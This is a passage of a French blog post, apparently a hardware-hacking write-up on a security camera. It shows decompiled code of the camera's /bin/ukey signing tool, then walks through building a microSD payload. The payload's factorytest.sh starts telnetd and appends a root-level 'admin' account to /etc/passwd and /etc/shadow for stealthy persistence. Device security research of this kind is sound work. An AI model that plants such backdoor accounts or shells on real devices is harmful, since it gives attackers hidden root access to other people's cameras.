+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">puVar8&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">puVar8&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span> &lt;span class="k">while&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">uVar7&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="n">uVar1&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">iVar3&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">uVar6&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">uVar1&lt;/span> &lt;span class="n">_&lt;/span> &lt;span class="mi">4&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">local_9c&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">local_9c&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">uVar1&lt;/span> &lt;span class="n">_&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="mh">0x100&lt;/span> &lt;span class="o">-&lt;/span> &lt;span class="n">uVar4&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="n">uVar1&lt;/span> &lt;span class="err">\&lt;/span>&lt;span class="o">*&lt;/span> &lt;span class="mi">4&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">**&lt;/span>&lt;span class="n">ptr&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">iVar3&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="o">~&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">**&lt;/span>&lt;span class="n">ptr&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">iVar3&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">^&lt;/span> &lt;span class="mh">0x79&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">local_9c&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">**&lt;/span>&lt;span class="n">ptr&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">iVar3&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="o">~&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">**&lt;/span>&lt;span class="n">ptr&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">iVar3&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">^&lt;/span> &lt;span class="mh">0x79&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">local_9c&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="mi">2&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">**&lt;/span>&lt;span class="n">ptr&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">iVar3&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mi">2&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="o">~&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">**&lt;/span>&lt;span class="n">ptr&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">iVar3&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mi">2&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">^&lt;/span> &lt;span class="mh">0x79&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nf">fseek&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">**&lt;/span>&lt;span class="n">stream&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nf">fwrite&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">**&lt;/span>&lt;span class="n">ptr&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mh">0x100&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="o">**&lt;/span>&lt;span class="n">stream&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nf">fclose&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">**&lt;/span>&lt;span class="n">stream&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nf">FUN_0000a3f4&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">optarg&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">break&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">default&lt;/span>&lt;span class="o">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nf">puts&lt;/span>&lt;span class="p">(&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">&amp;#34;use:&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s"> -w filename&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s"> -t filename&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s"> -u filename&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s"> -a filename&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s"> -n filename&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s"> -r fil ename&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">break&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">case&lt;/span> &lt;span class="mi">100&lt;/span>&lt;span class="o">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nf">FUN_0000aa84&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">optarg&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">break&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">case&lt;/span> &lt;span class="mh">0x65&lt;/span>&lt;span class="o">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nf">FUN_0000a914&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">optarg&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">break&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">case&lt;/span> &lt;span class="mh">0x6e&lt;/span>&lt;span class="o">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nf">FUN_0000a624&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">optarg&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">break&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">case&lt;/span> &lt;span class="mh">0x72&lt;/span>&lt;span class="o">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">local_94&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">local_90&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nf">printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;getKey %s&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">optarg&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">iVar3&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nf">FUN_000090f0&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">optarg&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">local_94&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">local_90&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">iVar3&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nf">puts&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;getKeyByData error.&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">else&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nf">sprintf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">local_8c&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s">&amp;#34;KEY=%08x%08d&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">local_94&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">local_90&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nf">puts&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">local_8c&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">break&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">case&lt;/span> &lt;span class="mh">0x74&lt;/span>&lt;span class="o">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">local_94&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">local_90&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">local_8c&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="sc">&amp;#39;\0&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">local_8c&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="sc">&amp;#39;\0&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">local_8c&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="sc">&amp;#39;\0&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">local_8c&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="sc">&amp;#39;\0&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">iVar3&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nf">FUN_000090f0&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">optarg&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">local_94&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">local_8c&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">if&lt;/span> &lt;span class="p">(((&lt;/span>&lt;span class="n">iVar3&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">||&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">iVar3&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nf">FUN_000098cc&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">optarg&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">local_90&lt;/span>&lt;span class="p">),&lt;/span> &lt;span class="n">iVar3&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="o">||&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">(&lt;/span>&lt;span class="n">local_94&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="n">local_90&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nf">puts&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;file changed.&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">return&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nf">puts&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;file not changed.&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">break&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">case&lt;/span> &lt;span class="mh">0x75&lt;/span>&lt;span class="o">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">iVar3&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nf">FUN_0000a07c&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">optarg&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">iVar3&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="k">goto&lt;/span> &lt;span class="n">LAB_00008abc&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nl">LAB_00008aa0&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nf">puts&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;write key error.&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">break&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">case&lt;/span> &lt;span class="mh">0x77&lt;/span>&lt;span class="o">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">iVar3&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nf">FUN_00009a18&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">optarg&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">iVar3&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="k">goto&lt;/span> &lt;span class="n">LAB_00008aa0&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nl">LAB_00008abc&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nf">printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;write key into %s succeed.&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">optarg&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span> &lt;span class="k">while&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nb">true&lt;/span> &lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
+&lt;/div>
+&lt;/div>
+&lt;p>Le diagramme de flux ci-dessous résume le fonctionnement global de &lt;strong>/bin/ukey&lt;/strong> :&lt;/p>
+&lt;script defer src="/js/mermaid-e4baee02.bundle.min.js">&lt;/script>
+&lt;pre class="gblog-mermaid mermaid text-center">flowchart LR
+A[Récupération des paramètres] --&amp;gt; B{Vérification}
+B --&amp;gt;|-t| D[Récupération de la varible KEY de ./auth.ini] --&amp;gt; F[Vérification de la signature fichier ./auth.ini]
+B --&amp;gt;|-r| E[Calcul et affichage de la signature du fichier ./auth.ini]
+B --&amp;gt;|..| ..&lt;/pre>
+&lt;blockquote>
+&lt;ul>
+&lt;li>Le paramètre -t est utilisé pour vérifier que la variable &lt;strong>KEY&lt;/strong> dans le fichier &lt;strong>./auth.ini&lt;/strong> comporte la bonne signature de ce dernier&lt;/li>
+&lt;li>Le paramètre -r est utilisé pour calculer la signature &lt;em>(KEY)&lt;/em> d&amp;rsquo;un fichier &lt;strong>./auth.ini&lt;/strong>&lt;/li>
+&lt;/ul>&lt;/blockquote>
+&lt;p>Bonne nouvelle, au lieu de perdre du temps à essayer de reverse la logique de calcul de signature, on peut directement l&amp;rsquo;obtenir avec le paramètre &lt;em>-r&lt;/em>.&lt;/p>
+&lt;div class="flex align-center gblog-post__anchorwrap">
+&lt;h2 id="assemblons-le-tout"
+>
+Assemblons le tout
+&lt;/h2>
+&lt;a data-clipboard-text="https://0x09.dev/posts/ease_life_security_camera_part_1/#assemblons-le-tout" class="gblog-post__anchor clip flex align-center" aria-label="Anchor Assemblons le tout" href="#assemblons-le-tout">
+&lt;svg class="gblog-icon gblog_link">&lt;use xlink:href="#gblog_link">&lt;/use>&lt;/svg>
+&lt;/a>
+&lt;/div>
+&lt;p>En résumé, pour pouvoir exécuter un script sur la caméra à travers la carte microSD il nous faudra :&lt;/p>
+&lt;table>
+&lt;thead>
+&lt;tr>
+&lt;th>Prérequis&lt;/th>
+&lt;th>Description&lt;/th>
+&lt;/tr>
+&lt;/thead>
+&lt;tbody>
+&lt;tr>
+&lt;td>&lt;strong>Une carte SD&lt;/strong>&lt;/td>
+&lt;td>comportera les éléments ci-dessous&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>&lt;strong>factorytest/&lt;/strong>&lt;/td>
+&lt;td>dossier dans la racine de la carte SD visant à contenir l&amp;rsquo;ensemble des fichiers nécessaires&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>&lt;strong>factorytest.sh&lt;/strong>&lt;/td>
+&lt;td>script avec les commandes à exécuter&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>&lt;strong>test.md5sum&lt;/strong>&lt;/td>
+&lt;td>fichier contenant le hash MD5 de &lt;em>factorytest.sh&lt;/em>&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>&lt;strong>auth.ini&lt;/strong>&lt;/td>
+&lt;td>fichier qui comportera la clé secrète &lt;em>(KEY)&lt;/em>, le nom du fichier &lt;em>md5sum&lt;/em> &lt;em>(MD5SUM_FILE)&lt;/em> et le hash MD5 du fichier &lt;em>test.md5sum&lt;/em> &lt;em>(MD5SUM_MD5)&lt;/em>&lt;/td>
+&lt;/tr>
+&lt;/tbody>
+&lt;/table>
+&lt;div class="flex align-center gblog-post__anchorwrap">
+&lt;h3 id="factorytestsh"
+>
+factorytest.sh
+&lt;/h3>
+&lt;a data-clipboard-text="https://0x09.dev/posts/ease_life_security_camera_part_1/#factorytestsh" class="gblog-post__anchor clip flex align-center" aria-label="Anchor factorytest.sh" href="#factorytestsh">
+&lt;svg class="gblog-icon gblog_link">&lt;use xlink:href="#gblog_link">&lt;/use>&lt;/svg>
+&lt;/a>
+&lt;/div>
+&lt;blockquote class="gblog-hint note">
+&lt;div class="gblog-hint__title flex align-center">&lt;i class="fa note" title="Note">&lt;/i>&lt;/div>
+&lt;div class="gblog-hint__text">&lt;p>Pour rappel, le contenu de la condition dans le script &lt;em>rcS&lt;/em> se termine par un &lt;em>exit 0&lt;/em>, empêchant le reste des modules nécessaires au bon fonctionnement de la caméra de démarrer. Une des solutions pour contourner cela &lt;em>(et avoir une persistance furtive)&lt;/em> est d&amp;rsquo;inclure dans notre payload le reste du contenu du script &lt;em>rcS&lt;/em>.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-text" data-lang="text">&lt;span class="line">&lt;span class="cl">if [ -d /mnt/sdcard/factorytest ]; then
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> echo &amp;#34;start factorytest...&amp;#34;
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> cd /mnt/sdcard/factorytest
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> /opt/sh/safe_exec.sh ./auth.ini ./factorytest.sh
+&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl"> exit 0
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">fi
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/div>
+&lt;/blockquote>
+&lt;p>Afin d&amp;rsquo;obtenir un shell stable sur la caméra, le script &lt;em>factorytest.sh&lt;/em> devra donc :&lt;/p>
+&lt;ol>
+&lt;li>Activer Telnet&lt;/li>
+&lt;li>Ajouter un nouvel utilisateur root &lt;em>(le mot de passe du root par défaut n&amp;rsquo;étant pas connu)&lt;/em>&lt;/li>
+&lt;/ol>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># factorytest.sh&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">...
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">...
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Démarrer le daemon Telnet&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">telnetd &lt;span class="p">&amp;amp;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Créer un nouvel utilisateur root (admin:admin)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">echo&lt;/span> &lt;span class="s1">&amp;#39;admin:x:0:0:root:/root:/bin/sh&amp;#39;&lt;/span> &amp;gt;&amp;gt; /etc/passwd
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">echo&lt;/span> &lt;span class="s1">&amp;#39;admin:$1$RY1L3lIe$vMOq.C7ie4Rg9qIMo8FJE.:0:0:99999:7:::&amp;#39;&lt;/span> &amp;gt;&amp;gt; /etc/shadow
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="flex align-center gblog-post__anchorwrap">
+&lt;h3 id="testmd5sum"
+>
+test.md5sum
+&lt;/h3>
+&lt;a data-clipboard-text="https://0x09.dev/posts/ease_life_security_camera_part_1/#testmd5sum" class="gblog-post__anchor clip flex align-center" aria-label="Anchor test.md5sum" href="#testmd5sum">
+&lt;svg class="gblog-icon gblog_link">&lt;use xlink:href="#gblog_link">&lt;/use>&lt;/svg>
+&lt;/a>
+&lt;/div>
+&lt;p>Pour fichier &lt;em>test.md5sum&lt;/em>, on devra simplement y inclure le hash MD5 du fichier &lt;em>factorytest.sh&lt;/em> final :&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">$ md5sum factorytest.sh
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">a2fb1a330b1a2b3a2c45655ef6c47ef9 factorytest.sh
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">$ &lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;a2fb1a330b1a2b3a2c45655ef6c47ef9 factorytest.sh&amp;#34;&lt;/span> &amp;gt; test.md5sum
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">$ md5sum -c test.md5sum
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">factorytest.sh: OK
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">$ md5sum test.md5sum &lt;span class="c1"># à utiliser dans auth.ini&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">1de768028943bae86bfc10a607ceec56 test.md5sum
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="flex align-center gblog-post__anchorwrap">
+&lt;h3 id="authini"
+>
+auth.ini
+&lt;/h3>
+&lt;a data-clipboard-text="https://0x09.dev/posts/ease_life_security_camera_part_1/#authini" class="gblog-post__anchor clip flex align-center" aria-label="Anchor auth.ini" href="#authini">
+&lt;svg class="gblog-icon gblog_link">&lt;use xlink:href="#gblog_link">&lt;/use>&lt;/svg>
+&lt;/a>
+&lt;/div>
+&lt;p>Préremplissons dans un premier temps le fichier &lt;em>auth.ini&lt;/em> avec les valeurs connues :&lt;/p>
